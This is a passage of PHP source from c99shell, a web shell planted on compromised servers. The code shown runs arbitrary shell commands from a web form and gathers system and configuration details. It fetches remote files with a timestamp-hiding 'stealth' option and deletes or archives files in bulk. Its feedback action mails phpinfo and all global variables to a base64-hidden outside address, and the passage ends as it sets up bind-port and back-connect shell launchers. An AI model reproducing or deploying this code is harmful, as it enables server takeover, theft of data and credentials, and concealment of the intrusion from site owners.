 displaysecinfo("OS Version?",myshellexec("cat /proc/version"));
 displaysecinfo("Kernel version?",myshellexec("sysctl -a | grep version"));
 displaysecinfo("Distrib name",myshellexec("cat /etc/issue.net"));
 displaysecinfo("Distrib name (2)",myshellexec("cat /etc/*-realise"));
 displaysecinfo("CPU?",myshellexec("cat /proc/cpuinfo"));
 displaysecinfo("RAM",myshellexec("free -m"));
 displaysecinfo("HDD space",myshellexec("df -h"));
 displaysecinfo("List of Attributes",myshellexec("lsattr -a"));
 displaysecinfo("Mount options ",myshellexec("cat /etc/fstab"));
 displaysecinfo("Is cURL installed?",myshellexec("which curl"));
 displaysecinfo("Is lynx installed?",myshellexec("which lynx"));
 displaysecinfo("Is links installed?",myshellexec("which links"));
 displaysecinfo("Is fetch installed?",myshellexec("which fetch"));
 displaysecinfo("Is GET installed?",myshellexec("which GET"));
 displaysecinfo("Is perl installed?",myshellexec("which perl"));
 displaysecinfo("Where is apache",myshellexec("whereis apache"));
 displaysecinfo("Where is perl?",myshellexec("whereis perl"));
 displaysecinfo("locate proftpd.conf",myshellexec("locate proftpd.conf"));
 displaysecinfo("locate httpd.conf",myshellexec("locate httpd.conf"));
 displaysecinfo("locate my.conf",myshellexec("locate my.conf"));
 displaysecinfo("locate psybnc.conf",myshellexec("locate psybnc.conf"));
}
if ($act == "mkfile")
{
 if ($mkfile != $d)
 {
  if (file_exists($mkfile)) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: object alredy exists";}
  elseif (!fopen($mkfile,"w")) {echo "<b>Make File \"".htmlspecialchars($mkfile)."\"</b>: access denied";}
  else {$act = "f"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPARATOR) {$d .= DIRECTORY_SEPARATOR;} $f = basename($mkfile);}
 }
 else {$act = $dspact = "ls";}
}
if ($act == "encoder")
{
 echo "<script>function set_encoder_input(text) {document.forms.encoder.input.value = text;}</script><center><b>Encoder:</b></center><form name=\"encoder\" method=\"POST\"><b>Input:</b><center><textarea name=\"encoder_input\" id=\"input\" cols=50 rows=5>".@htmlspecialchars($encoder_input)."</textarea><br><br><input type=submit value=\"calculate\"><br><br></center><b>Hashes</b>:<br><center>";
 foreach(array("md5","crypt","sha1","crc32") as $v)
 {
  echo $v." - <input type=text size=50 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$v($encoder_input)."\" readonly><br>";
 }
 echo "</center><b>Url:</b><center><br>urlencode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".urlencode($encoder_input)."\" readonly>
 <br>urldecode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".htmlspecialchars(urldecode($encoder_input))."\" readonly>
 <br></center><b>Base64:</b><center>base64_encode - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".base64_encode($encoder_input)."\" readonly></center>";
 echo "<center>base64_decode - ";
 if (base64_encode(base64_decode($encoder_input)) != $encoder_input) {echo "<input type=text size=35 value=\"failed\" disabled readonly>";}
 else
 {
  $debase64 = base64_decode($encoder_input);
  $debase64 = str_replace("\0","[0]",$debase64);
  $a = explode("\r\n",$debase64);
  $rows = count($a);
  $debase64 = htmlspecialchars($debase64);
  if ($rows == 1) {echo "<input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"".$debase64."\" id=\"debase64\" readonly>";}
  else {$rows++; echo "<textarea cols=\"40\" rows=\"".$rows."\" onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" id=\"debase64\" readonly>".$debase64."</textarea>";}
  echo "&nbsp;<a href=\"#\" onclick=\"set_encoder_input(document.forms.encoder.debase64.value)\"><b>^</b></a>";
 }
 echo "</center><br><b>Base convertations</b>:<center>dec2hex - <input type=text size=35 onFocus=\"this.select()\" onMouseover=\"this.select()\" onMouseout=\"this.select()\" value=\"";
 $c = strlen($encoder_input);
 for($i=0;$i<$c;$i++)
 {
  $hex = dechex(ord($encoder_input[$i]));
  if ($encoder_input[$i] == "&") {echo $encoder_input[$i];}
  elseif ($encoder_input[$i] != "\\") {echo "%".$hex;}
 }
 echo "\" readonly><br></center></form>";
}
if ($act == "fsbuff")
{
 $arr_copy = $sess_data["copy"];
 $arr_cut = $sess_data["cut"];
 $arr = array_merge($arr_copy,$arr_cut);
 if (count($arr) == 0) {echo "<center><b>Buffer is empty!</b></center>";}
 else {echo "<b>File-System buffer</b><br><br>"; $ls_arr = $arr; $disp_fullpath = true; $act = "ls";}
}
if ($act == "selfremove")
{
 if (($submit == $rndcode) and ($submit != ""))
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using c99shell v.".$shver."!"; c99shexit(); }
  else {echo "<center><b>Can't delete ".__FILE__."!</b></center>";}
 }
 else
 {
  if (!empty($rndcode)) {echo "<b>Error: incorrect confimation!</b>";}
  $rnd = rand(0,9).rand(0,9).rand(0,9);
  echo "<form method=\"POST\"><b>Self-remove: ".__FILE__." <br><b>Are you sure?<br>For confirmation, enter \"".$rnd."\"</b>:&nbsp;<input type=hidden name=rndcode value=\"".$rnd."\"><input type=text name=submit>&nbsp;<input type=submit value=\"YES\"></form>";
 }
}
if ($act == "update") {$ret = c99sh_getupdate(!!$confirmupdate); echo "<b>".$ret."</b>"; if (stristr($ret,"new version")) {echo "<br><br><input type=button onclick=\"location.href='".$surl."act=update&confirmupdate=1';\" value=\"Update now\">";}}
if ($act == "feedback")
{
 $suppmail = base64_decode("Yzk5c2hlbGxAaW5ib3gucnU=");
 if (!empty($submit))
 {
  $ticket = substr(md5(microtime()+rand(1,1000)),0,6);
  $body = "c99shell v.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
  if (!empty($fdbk_ref))
  {
   $tmp = @ob_get_contents();
   ob_clean();
   phpinfo();
   $phpinfo = base64_encode(ob_get_contents());
   ob_clean();
   echo $tmp;
   $body .= "\n"."phpinfo(): ".$phpinfo."\n"."\$GLOBALS=".base64_encode(serialize($GLOBALS))."\n";
  }
  mail($suppmail,"c99shell v.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
  echo "<center><b>Thanks for your feedback! Your ticket ID: ".$ticket.".</b></center>";
 }
 else {echo "<form method=\"POST\"><b>Feedback or report bug (".str_replace(array("@","."),array("[at]","[dot]"),$suppmail)."):<br><br>Your name: <input type=\"text\" name=\"fdbk_name\" value=\"".htmlspecialchars($fdbk_name)."\"><br><br>Your e-mail: <input type=\"text\" name=\"fdbk_email\" value=\"".htmlspecialchars($fdbk_email)."\"><br><br>Message:<br><textarea name=\"fdbk_body\" cols=80 rows=10>".htmlspecialchars($fdbk_body)."</textarea><input type=\"hidden\" name=\"fdbk_ref\" value=\"".urlencode($HTTP_REFERER)."\"><br><br>Attach server-info * <input type=\"checkbox\" name=\"fdbk_servinf\" value=\"1\" checked><br><br>There are no checking in the form.<br><br>* - strongly recommended, if you report bug, because we need it for bug-fix.<br><br>We understand languages: English, Russian.<br><br><input type=\"submit\" name=\"submit\" value=\"Send\"></form>";}
}
if ($act == "search")
{
 echo "<b>Search in file-system:</b><br>";
 if (empty($search_in)) {$search_in = $d;}
 if (empty($search_name)) {$search_name = "(.*)"; $search_name_regexp = 1;}
 if (empty($search_text_wwo)) {$search_text_regexp = 0;}
 if (!empty($submit))
 {
  $found = array();
  $found_d = 0;
  $found_f = 0;
  $search_i_f = 0;
  $search_i_d = 0;
  $a = array
  (
   "name"=>$search_name, "name_regexp"=>$search_name_regexp,
   "text"=>$search_text, "text_regexp"=>$search_text_regxp,
   "text_wwo"=>$search_text_wwo,
   "text_cs"=>$search_text_cs,
   "text_not"=>$search_text_not
  );
  $searchtime = getmicrotime();
  $in = array_unique(explode(";",$search_in));
  foreach($in as $v) {c99fsearch($v);}
  $searchtime = round(getmicrotime()-$searchtime,4);
  if (count($found) == 0) {echo "<b>No files found!</b>";}
  else
  {
   $ls_arr = $found;
   $disp_fullpath = true;
   $act = "ls";
  }
 }
 echo "<form method=\"POST\">
<input type=hidden name=\"d\" value=\"".$dispd."\"><input type=hidden name=act value=\"".$dspact."\">
<b>Search for (file/folder name): </b><input type=\"text\" name=\"search_name\" size=\"".round(strlen($search_name)+25)."\" value=\"".htmlspecialchars($search_name)."\">&nbsp;<input type=\"checkbox\" name=\"search_name_regexp\" value=\"1\" ".($search_name_regexp == 1?" checked":"")."> - regexp
<br><b>Search in (explode \";\"): </b><input type=\"text\" name=\"search_in\" size=\"".round(strlen($search_in)+25)."\" value=\"".htmlspecialchars($search_in)."\">
<br><br><b>Text:</b><br><textarea name=\"search_text\" cols=\"122\" rows=\"10\">".htmlspecialchars($search_text)."</textarea>
<br><br><input type=\"checkbox\" name=\"search_text_regexp\" value=\"1\" ".($search_text_regexp == 1?" checked":"")."> - regexp
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_wwo\" value=\"1\" ".($search_text_wwo == 1?" checked":"")."> - <u>w</u>hole words only
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_cs\" value=\"1\" ".($search_text_cs == 1?" checked":"")."> - cas<u>e</u> sensitive
&nbsp;&nbsp;<input type=\"checkbox\" name=\"search_text_not\" value=\"1\" ".($search_text_not == 1?" checked":"")."> - find files <u>NOT</u> containing the text
<br><br><input type=submit name=submit value=\"Search\"></form>";
 if ($act == "ls") {$dspact = $act; echo "<hr size=\"1\" noshade><b>Search took ".$searchtime." secs (".$search_i_f." files and ".$search_i_d." folders, ".round(($search_i_f+$search_i_d)/$searchtime,4)." objects per second).</b><br><br>";}
}
if ($act == "chmod")
{
 $mode = fileperms($d.$f);
 if (!$mode) {echo "<b>Change file-mode with error:</b> can't get current value.";}
 else
 {
  $form = true;
  if ($chmod_submit)
  {
   $octet = "0".base_convert(($chmod_o["r"]?1:0).($chmod_o["w"]?1:0).($chmod_o["x"]?1:0).($chmod_g["r"]?1:0).($chmod_g["w"]?1:0).($chmod_g["x"]?1:0).($chmod_w["r"]?1:0).($chmod_w["w"]?1:0).($chmod_w["x"]?1:0),2,8);
   if (chmod($d.$f,$octet)) {$act = "ls"; $form = false; $err = "";}
   else {$err = "Can't chmod to ".$octet.".";}
  }
  if ($form)
  {
   $perms = parse_perms($mode);
   echo "<b>Changing file-mode (".$d.$f."), ".view_perms_color($d.$f)." (".substr(decoct(fileperms($d.$f)),-4,4).")</b><br>".($err?"<b>Error:</b> ".$err:"")."<form action=\"".htmlspecialchars($surl)."\" method=\"POST\"><input type=hidden name=d value=\"".htmlspecialchars($d)."\"><input type=hidden name=f value=\"".htmlspecialchars($f)."\"><input type=hidden name=act value=chmod><table align=left width=300 border=0 cellspacing=0 cellpadding=5><tr><td><b>Owner</b><br><br><input type=checkbox NAME=chmod_o[r] value=1".($perms["o"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox name=chmod_o[w] value=1".($perms["o"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_o[x] value=1".($perms["o"]["x"]?" checked":"").">eXecute</td><td><b>Group</b><br><br><input type=checkbox NAME=chmod_g[r] value=1".($perms["g"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_g[w] value=1".($perms["g"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_g[x] value=1".($perms["g"]["x"]?" checked":"").">eXecute</font></td><td><b>World</b><br><br><input type=checkbox NAME=chmod_w[r] value=1".($perms["w"]["r"]?" checked":"").">&nbsp;Read<br><input type=checkbox NAME=chmod_w[w] value=1".($perms["w"]["w"]?" checked":"").">&nbsp;Write<br><input type=checkbox NAME=chmod_w[x] value=1".($perms["w"]["x"]?" checked":"").">eXecute</font></td></tr><tr><td><input type=submit name=chmod_submit value=\"Save\"></td></tr></table></form>";
  }
 }
}
if ($act == "upload")
{
 $uploadmess = "";
 $uploadpath = str_replace("\\",DIRECTORY_SEPARATOR,$uploadpath);
 if (empty($uploadpath)) {$uploadpath = $d;}
 elseif (substr($uploadpath,-1) != "/") {$uploadpath .= "/";}
 if (!empty($submit))
 {
  global $HTTP_POST_FILES;
  $uploadfile = $HTTP_POST_FILES["uploadfile"];
  if (!empty($uploadfile["tmp_name"]))
  {
   if (empty($uploadfilename)) {$destin = $uploadfile["name"];}
   else {$destin = $userfilename;}
   if (!move_uploaded_file($uploadfile["tmp_name"],$uploadpath.$destin)) {$uploadmess .= "Error uploading file ".$uploadfile["name"]." (can't copy \"".$uploadfile["tmp_name"]."\" to \"".$uploadpath.$destin."\"!<br>";}
  }
  elseif (!empty($uploadurl))
  {
   if (!empty($uploadfilename)) {$destin = $uploadfilename;}
   else
   {
    $destin = explode("/",$destin);
    $destin = $destin[count($destin)-1];
    if (empty($destin))
    {
     $i = 0;
     $b = "";
     while(file_exists($uploadpath.$destin)) {if ($i > 0) {$b = "_".$i;} $destin = "index".$b.".html"; $i++;}}
   }
   if ((!eregi("http://",$uploadurl)) and (!eregi("https://",$uploadurl)) and (!eregi("ftp://",$uploadurl))) {echo "<b>Incorect url!</b><br>";}
   else
   {
    $st = getmicrotime();
    $content = @file_get_contents($uploadurl);
    $dt = round(getmicrotime()-$st,4);
    if (!$content) {$uploadmess .=  "Can't download file!<br>";}
    else
    {
     if ($filestealth) {$stat = stat($uploadpath.$destin);}
     $fp = fopen($uploadpath.$destin,"w");
     if (!$fp) {$uploadmess .= "Error writing to file ".htmlspecialchars($destin)."!<br>";}
     else
     {
      fwrite($fp,$content,strlen($content));
      fclose($fp);
      if ($filestealth) {touch($uploadpath.$destin,$stat[9],$stat[8]);}
     }
    }
   }
  }
 }
 if ($miniform)
 {
  echo "<b>".$uploadmess."</b>";
  $act = "ls";
 }
 else
 {
  echo "<b>File upload:</b><br><b>".$uploadmess."</b><form enctype=\"multipart/form-data\" action=\"".$surl."act=upload&d=".urlencode($d)."\" method=\"POST\">
Select file on your local computer: <input name=\"uploadfile\" type=\"file\"><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;or<br>
Input URL: <input name=\"uploadurl\" type=\"text\" value=\"".htmlspecialchars($uploadurl)."\" size=\"70\"><br><br>
Save this file dir: <input name=\"uploadpath\" size=\"70\" value=\"".$dispd."\"><br><br>
File-name (auto-fill): <input name=uploadfilename size=25><br><br>
<input type=checkbox name=uploadautoname value=1 id=df4>&nbsp;convert file name to lovercase<br><br>
<input type=submit name=submit value=\"Upload\">
</form>";
 }
}
if ($act == "delete")
{
 $delerr = "";
 foreach ($actbox as $v)
 {
  $result = false;
  $result = fs_rmobj($v);
  if (!$result) {$delerr .= "Can't delete ".htmlspecialchars($v)."<br>";}
 }
 if (!empty($delerr)) {echo "<b>Deleting with errors:</b><br>".$delerr;}
 $act = "ls";
}
if (!$usefsbuff)
{
 if (($act == "paste") or ($act == "copy") or ($act == "cut") or ($act == "unselect")) {echo "<center><b>Sorry, buffer is disabled. For enable, set directive \"\$useFSbuff\" as TRUE.</center>";}
}
else
{
 if ($act == "copy") {$err = ""; $sess_data["copy"] = array_merge($sess_data["copy"],$actbox); c99_sess_put($sess_data); $act = "ls"; }
 elseif ($act == "cut") {$sess_data["cut"] = array_merge($sess_data["cut"],$actbox); c99_sess_put($sess_data); $act = "ls";}
 elseif ($act == "unselect") {foreach ($sess_data["copy"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["copy"][$k]);}} foreach ($sess_data["cut"] as $k=>$v) {if (in_array($v,$actbox)) {unset($sess_data["cut"][$k]);}} c99_sess_put($sess_data); $act = "ls";}
 if ($actemptybuff) {$sess_data["copy"] = $sess_data["cut"] = array(); c99_sess_put($sess_data);}
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$to)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$to)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
 elseif ($actarcbuff)
 {
  $arcerr = "";
  if (substr($actarcbuff_path,-7,7) == ".tar.gz") {$ext = ".tar.gz";}
  else {$ext = ".tar.gz";}
  if ($ext == ".tar.gz") {$cmdline = "tar cfzv";}
  $cmdline .= " ".$actarcbuff_path;
  $objects = array_merge($sess_data["copy"],$sess_data["cut"]);
  foreach($objects as $v)
  {
   $v = str_replace("\\",DIRECTORY_SEPARATOR,$v);
   if (substr($v,0,strlen($d)) == $d) {$v = basename($v);}
   if (is_dir($v))
   {
    if (substr($v,-1) != DIRECTORY_SEPARATOR) {$v .= DIRECTORY_SEPARATOR;}
    $v .= "*";
   }
   $cmdline .= " ".$v;
  }
  $tmp = realpath(".");
  chdir($d);
  $ret = myshellexec($cmdline);
  chdir($tmp);
  if (empty($ret)) {$arcerr .= "Can't call archivator (".htmlspecialchars(str2mini($cmdline,60)).")!<br>";}
  $ret = str_replace("\r\n","\n",$ret);
  $ret = explode("\n",$ret);
  if ($copy_unset) {foreach($sess_data["copy"] as $k=>$v) {unset($sess_data["copy"][$k]);}}
  foreach($sess_data["cut"] as $k=>$v)
  {
   if (in_array($v,$ret)) {fs_rmobj($v);}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($arcerr)) {echo "<b>Archivation errors:</b><br>".$arcerr;}
  $act = "ls";
 }
 elseif ($actpastebuff)
 {
  $psterr = "";
  foreach($sess_data["copy"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_copy_obj($v,$d)) {$psterr .= "Can't copy ".$v." to ".$to."!<br>";}
   if ($copy_unset) {unset($sess_data["copy"][$k]);}
  }
  foreach($sess_data["cut"] as $k=>$v)
  {
   $to = $d.basename($v);
   if (!fs_move_obj($v,$d)) {$psterr .= "Can't move ".$v." to ".$to."!<br>";}
   unset($sess_data["cut"][$k]);
  }
  c99_sess_put($sess_data);
  if (!empty($psterr)) {echo "<b>Pasting with errors:</b><br>".$psterr;}
  $act = "ls";
 }
}
if ($act == "cmd")
{
if (trim($cmd) == "ps -aux") {$act = "processes";}
elseif (trim($cmd) == "tasklist") {$act = "processes";}
else
{
 @chdir($chdir);
 if (!empty($submit))
 {
  echo "<b>Result of execution this command</b>:<br>";
  $olddir = realpath(".");
  @chdir($d);
  $ret = myshellexec($cmd);
  $ret = convert_cyr_string($ret,"d","w");
  if ($cmd_txt)
  {
   $rows = count(explode("\r\n",$ret))+1;
   if ($rows < 10) {$rows = 10;}
   echo "<br><textarea cols=\"122\" rows=\"".$rows."\" readonly>".htmlspecialchars($ret)."</textarea>";
  }
  else {echo $ret."<br>";}
  @chdir($olddir);
 }
 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = true;}}
 echo "<form action=\"".$surl."act=cmd\" method=\"POST\"><textarea name=\"cmd\" cols=\"122\" rows=\"10\">".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
}
if ($act == "ls")
{
 if (count($ls_arr) > 0) {$list = $ls_arr;}
 else
 {
  $list = array();
  if ($h = @opendir($d))
  {
   while (($o = readdir($h)) !== false) {$list[] = $d.$o;}
   closedir($h);
  }
  else {}
 }
 if (count($list) == 0) {echo "<center><b>Can't open folder (".htmlspecialchars($d).")!</b></center>";}
 else
 {
  //Building array
  $objects = array();
  $vd = "f"; //Viewing mode
  if ($vd == "f")
  {
   $objects["head"] = array();
   $objects["folders"] = array();
   $objects["links"] = array();
   $objects["files"] = array();
   foreach ($list as $v)
   {
    $o = basename($v);
    $row = array();
    if ($o == ".") {$row[] = $d.$o; $row[] = "LINK";}
    elseif ($o == "..") {$row[] = $d.$o; $row[] = "LINK";}
    elseif (is_dir($v))
    {
     if (is_link($v)) {$type = "LINK";}
     else {$type = "DIR";}
     $row[] = $v;
     $row[] = $type;
    }
    elseif(is_file($v)) {$row[] = $v; $row[] = filesize($v);}
    $row[] = filemtime($v);
    if (!$win)
    {
     $ow = @posix_getpwuid(fileowner($v));
     $gr = @posix_getgrgid(filegroup($v));
     $row[] = $ow["name"]."/".$gr["name"];
     $row[] = fileowner($v)."/".filegroup($v);
    }
    $row[] = fileperms($v);
    if (($o == ".") or ($o == "..")) {$objects["head"][] = $row;}
    elseif (is_link($v)) {$objects["links"][] = $row;}
    elseif (is_dir($v)) {$objects["folders"][] = $row;}
    elseif (is_file($v)) {$objects["files"][] = $row;}
    $i++;
   }
   $row = array();
   $row[] = "<b>Name</b>";
   $row[] = "<b>Size</b>";
   $row[] = "<b>Modify</b>";
   if (!$win)
  {$row[] = "<b>Owner/Group</b>";}
   $row[] = "<b>Perms</b>";
   $row[] = "<b>Action</b>";
   $parsesort = parsesort($sort);
   $sort = $parsesort[0].$parsesort[1];
   $k = $parsesort[0];
   if ($parsesort[1] != "a") {$parsesort[1] = "d";}
   $y = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$k.($parsesort[1] == "a"?"d":"a")."\">";
   $y .= "<img src=\"".$surl."act=img&img=sort_".($sort[1] == "a"?"asc":"desc")."\" height=\"9\" width=\"14\" alt=\"".($parsesort[1] == "a"?"Asc.":"Desc")."\" border=\"0\"></a>";
   $row[$k] .= $y;
   for($i=0;$i<count($row)-1;$i++)
   {
    if ($i != $k) {$row[$i] = "<a href=\"".$surl."act=".$dspact."&d=".urlencode($d)."&sort=".$i.$parsesort[1]."\">".$row[$i]."</a>";}
   }
   $v = $parsesort[0];
   usort($objects["folders"], "tabsort");
   usort($objects["links"], "tabsort");
   usort($objects["files"], "tabsort");
   if ($parsesort[1] == "d")
   {
    $objects["folders"] = array_reverse($objects["folders"]);
    $objects["files"] = array_reverse($objects["files"]);
   }
   $objects = array_merge($objects["head"],$objects["folders"],$objects["links"],$objects["files"]);
   $tab = array();
   $tab["cols"] = array($row);
   $tab["head"] = array();
   $tab["folders"] = array();
   $tab["links"] = array();
   $tab["files"] = array();
   $i = 0;
   foreach ($objects as $a)
   {
    $v = $a[0];
    $o = basename($v);
    $dir = dirname($v);
    if ($disp_fullpath) {$disppath = $v;}
    else {$disppath = $o;}
    $disppath = str2mini($disppath,60);
    if (in_array($v,$sess_data["cut"])) {$disppath = "<strike>".$disppath."</strike>";}
    elseif (in_array($v,$sess_data["copy"])) {$disppath = "<u>".$disppath."</u>";}
    foreach ($regxp_highlight as $r)
    {
     if (ereg($r[0],$o))
     {
      if ((!is_numeric($r[1])) or ($r[1] > 3)) {$r[1] = 0; ob_clean(); echo "Warning! Configuration error in \$regxp_highlight[".$k."][0] - unknown command."; c99shexit();}
      else
      {
       $r[1] = round($r[1]);
       $isdir = is_dir($v);
       if (($r[1] == 0) or (($r[1] == 1) and !$isdir) or (($r[1] == 2) and !$isdir))
       {
        if (empty($r[2])) {$r[2] = "<b>"; $r[3] = "</b>";}
        $disppath = $r[2].$disppath.$r[3];
        if ($r[4]) {break;}
       }
      }
     }
    }
    $uo = urlencode($o);
    $ud = urlencode($dir);
    $uv = urlencode($v);
    $row = array();
    if ($o == ".")
    {
     $row[] = "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif ($o == "..")
    {
     $row[] = "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=".$dspact."&d=".urlencode(realpath($d.$o))."&sort=".$sort."\">".$o."</a>";
     $row[] = "LINK";
    }
    elseif (is_dir($v))
    {
     if (is_link($v))
     {
      $disppath .= " => ".readlink($v);
      $type = "LINK";
      $row[] =  "<img src=\"".$surl."act=img&img=ext_lnk\" height=\"16\" width=\"16\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
     }
     else
     {
      $type = "DIR";
      $row[] =  "<img src=\"".$surl."act=img&img=small_dir\" height=\"16\" width=\"19\" border=\"0\">&nbsp;<a href=\"".$surl."act=ls&d=".$uv."&sort=".$sort."\">[".$disppath."]</a>";
      }
     $row[] = $type;
    }
    elseif(is_file($v))
    {
     $ext = explode(".",$o);
     $c = count($ext)-1;
     $ext = $ext[$c];
     $ext = strtolower($ext);
     $row[] =  "<img src=\"".$surl."act=img&img=ext_".$ext."\" border=\"0\">&nbsp;<a href=\"".$surl."act=f&f=".$uo."&d=".$ud."&\">".$disppath."</a>";
     $row[] = view_size($a[1]);
    }
    $row[] = date("d.m.Y H:i:s",$a[2]);
    if (!$win) {$row[] = $a[3];}
    $row[] = "<a href=\"".$surl."act=chmod&f=".$uo."&d=".$ud."\"><b>".view_perms_color($v)."</b></a>";
    if ($o == ".") {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" onclick=\"ls_reverse_all();\">"; $i--;}
    else {$checkbox = "<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox".$i."\" value=\"".htmlspecialchars($v)."\">";}
    if (is_dir($v)) {$row[] = "<a href=\"".$surl."act=d&d=".$uv."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;".$checkbox;}
    else {$row[] = "<a href=\"".$surl."act=f&f=".$uo."&ft=info&d=".$ud."\"><img src=\"".$surl."act=img&img=ext_diz\" alt=\"Info\" height=\"16\" width=\"16\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=edit&d=".$ud."\"><img src=\"".$surl."act=img&img=change\" alt=\"Change\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;<a href=\"".$surl."act=f&f=".$uo."&ft=download&d=".$ud."\"><img src=\"".$surl."act=img&img=download\" alt=\"Download\" height=\"16\" width=\"19\" border=\"0\"></a>&nbsp;".$checkbox;}
    if (($o == ".") or ($o == "..")) {$tab["head"][] = $row;}
    elseif (is_link($v)) {$tab["links"][] = $row;}
    elseif (is_dir($v)) {$tab["folders"][] = $row;}
    elseif (is_file($v)) {$tab["files"][] = $row;}
    $i++;
   }
  }
  //Compiling table
  $table = array_merge($tab["cols"],$tab["head"],$tab["folders"],$tab["links"],$tab["files"]);
  echo "<center><b>Listing folder (".count($tab["files"])." files and ".(count($tab["folders"])+count($tab["links"]))." folders):</b></center><br><TABLE cellSpacing=0 cellPadding=0 width=100% bgColor=#333333 borderColorLight=#433333 border=0><form method=\"POST\" name=\"ls_form\">";
  foreach($table as $row)
  {
   echo "<tr>\r\n";
   foreach($row as $v) {echo "<td>".$v."</td>\r\n";}
   echo "</tr>\r\n";
  }
  echo "</table><hr size=\"1\" noshade><p align=\"right\">
  <script>
  function ls_setcheckboxall(status)
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id <= num)
   {
    document.getElementById('actbox'+id).checked = status;
    id++;
   }
  }
  function ls_reverse_all()
  {
   var id = 0;
   var num = ".(count($table)-2).";
   while (id <= num)
   {
    document.getElementById('actbox'+id).checked = !document.getElementById('actbox'+id).checked;
    id++;
   }
  }
  </script>
  <input type=\"button\" onclick=\"ls_setcheckboxall(true);\" value=\"Select all\">&nbsp;&nbsp;<input type=\"button\" onclick=\"ls_setcheckboxall(false);\" value=\"Unselect all\">
  <b><img src=\"".$surl."act=img&img=arrow_ltr\" border=\"0\">";
  if (count(array_merge($sess_data["copy"],$sess_data["cut"])) > 0 and ($usefsbuff))
  {
   echo "<input type=submit name=\"actarcbuff\" value=\"Pack buffer to archive\">&nbsp;<input type=\"text\" name=\"actarcbuff_path\" value=\"archive_".substr(md5(rand(1,1000).rand(1,1000)),0,5).".tar.gz\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actpastebuff\" value=\"Paste\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type=submit name=\"actemptybuff\" value=\"Empty buffer\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
  }
  echo "<select name=act><option value=\"".$act."\">With selected:</option>";
  echo "<option value=\"delete\"".($dspact == "delete"?" selected":"").">Delete</option>";
  echo "<option value=\"chmod\"".($dspact == "chmod"?" selected":"").">Change-mode</option>";
  if ($usefsbuff)
  {
   echo "<option value=\"cut\"".($dspact == "cut"?" selected":"").">Cut</option>";
   echo "<option value=\"copy\"".($dspact == "copy"?" selected":"").">Copy</option>";
   echo "<option value=\"unselect\"".($dspact == "unselect"?" selected":"").">Unselect</option>";
  }
  echo "</select>&nbsp;<input type=submit value=\"Confirm\"></p>";
  echo "</form>";
 }
}
if ($act == "bind")
{
 $bndportsrcs = array(
"c99sh_bindport.pl"=>array("Using PERL","perl %path %port"),
"c99sh_bindport.c"=>array("Using C","%path %port %pass")
);
 $bcsrcs = array(
"c99sh_backconn.pl"=>array("Using PERL","perl %path %host %port"),
"c99sh_backconn.c"=>array("Using C","%path %host %port")
);
